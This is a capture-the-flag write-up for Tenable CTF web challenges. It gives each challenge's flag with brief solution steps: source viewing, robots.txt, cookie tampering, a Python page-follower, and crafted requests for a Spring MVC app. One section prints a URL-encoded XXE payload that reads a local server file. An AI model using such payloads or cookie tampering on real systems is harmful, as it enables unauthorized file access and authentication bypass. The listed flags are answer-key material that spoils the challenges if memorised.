**[Source of All Evil](http://167.71.246.232/)**  
View soure, we got the flag
```
flag{best_implants_ever}
```
**[Headers for you inspiration]((http://167.71.246.232/)**  
Using burp suite to view header, we got the flag
```
flag{headersftw}
```

**[Stay Away Creepy Crawlers](http://167.71.246.232/)**  
Check http://167.71.246.232:8080/robots.txt and we got the flag
```
flag{mr_roboto}
```
**[Show me what you got](http://167.71.246.232/)**  
View source, it has a img src
```html
<img src='/images/doc_jones.png'>
```
Check images folder, we got the flag in http://167.71.246.232/images/aljdi3sd.txt
```
flag{disable_directory_indexes}
```

**[Can't find it](http://167.71.246.232/)**  
Just go somewhere Page not found and we got
```
flag{404_oh_no}
```

**[Ripper Doc](http://167.71.246.232/)**  
Go to first link in menu http://167.71.246.232/certified_rippers.php  
We have a hint
```
Sorry, gotta be in the club to get this list.
```
Check cookie and change <i>authenticated</i> to True, we got the flag
```
flag{messing_with_cookies}
```

**[Follow The Rabbit Hole](http://167.71.246.232/)**  
Write the code to follow page
```python
import requests

url = 'http://167.71.246.232:8080/rabbit_hole.php?page='
code = 'cE4g5bWZtYCuovEgYSO1'
i = 0;
while i < 1:
    x = requests.get(url+code)
    code = x.text.split(' ')[2]
    print(x.text)
    i = i + 1
```
Notice that i = 1582, this will end, and the first parameter is less than 1582, so assume it is a index, and the second parameter is a value
```python
import requests

url = 'http://167.71.246.232:8080/rabbit_hole.php?page='
code = 'cE4g5bWZtYCuovEgYSO1'
i = 0;
a = ['0' for i in range(1582)]
while i < 15:
    x = requests.get(url+code)
    code = x.text.split(' ')[2]
    para1 = int(x.text.split(', ')[0].split('[')[1])
    para2 = x.text.split(', \'')[1].split('\']')[0]
    a[para1] = para2
    i = i + 1
s = ''
for c in a:
    s = s + c
print(s)
```
Using [Cyberchef](https://gchq.github.io/CyberChef/) to check this. It's a png image  
![img](https://lhtthao0430.github.io/web/tenable/FollowTheRabbitHole.png)  
We got
```
flag{automation_is_handy}
```

**[Send A Letter](http://challenges.ctfd.io:30471/)**  
View source, in line 34 it send a get request  
```
$.get("send_letter.php?letter="+letter, function(data, status){
			alert("Data: " + data + "\nStatus: " + status);
		});
```
In line 13 it uses xml
```
var letter = "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>";
```
We can use XXE attack
```html
xml%20version=%221.0%22%20encoding=%22ISO-8859-1%22?%3E%3C!DOCTYPE%20foo%20[%20%3C!ENTITY%20xxe%20SYSTEM%20%22file:///tmp/messages_outbound.txt%22%3E%20]%3E%3Cletter%3E%3Cname%3E%26xxe;%3C/name%3E%3C/letter%3E
```
We got the flag
```
flag{xxe_aww_yeah}
```

**[Source code](https://lhtthao0430.github.io/web/tenable/tenable-ctf-spring-mvc-app.zip) and [Web](http://challenges.ctfd.io:30542/) for Sprint MVC**  
**Spring MVC 1**  
After view source code, send GET request to http://challenges.ctfd.io:30542/main to get the flag
```
flag{flag1_517d74}
```
**Spring MVC 2**  
Send POST request to http://challenges.ctfd.io:30542/main with body
```
magicWord=abc
```
```
flag{flag2_de3981}
```
**Spring MVC 3**  
Send POST request to http://challenges.ctfd.io:30542/main with body
```
magicWord=please
```
```
flag{flag3_0d431e}
```
**Spring MVC 4**  
Send post request to http://challenges.ctfd.io:30542/main with content-type
```
Content-type=application/json
```
```
flag{flag4_695954}
```
**Spring MVC 5**  
Send OPTIONS request to http://challenges.ctfd.io:30542/main with content-type
```
Content-type=application/json
```
```
flag{flag5_70102b}
```
**Spring MVC 6**  
Send GET request to http://challenges.ctfd.io:30542/main with headers
```
Magic-Word=please
```
```
flag{flag6_ca1ddf}
```
**Spring MVC 7**  
View source code tenable-ctf-spring-mvc-app\src\main\resources\templates\.hello.html, we see
```html
<p th:if="${name == 'please'}">
<span class="hidden" th:text="${@flagService.getFlag('hidden_flag')}" />
</p>
```  
Send GET request to http://challenges.ctfd.io:30542?name=please  
```
flag{hidden_flag_1dbc4}
```
**Spring MVC 8**  
View source code tenable-ctf-spring-mvc-app\src\main\resources\templates\.hello.html, we see
```html
<p th:if="${#session.getAttribute('realName') == 'admin'}">
<span th:text="${#session.getAttribute('sessionFlag')}" />
</p>
```  
And we have other controller, that will set session realName for us
```java
@GetMapping("/other")
public String index(@RequestParam(name="name", required=false, defaultValue="user") String realName, HttpSession session, Model model) {
    session.setAttribute("realName", realName);
    model.addAttribute("name", realName);
    return "hello";
}
```
Send GET request to http://challenges.ctfd.io:30542/other?name=admin  
After that, send GET request to http://challenges.ctfd.io:30542/ and get the flag
```
flag{session_flag_0dac2c}
```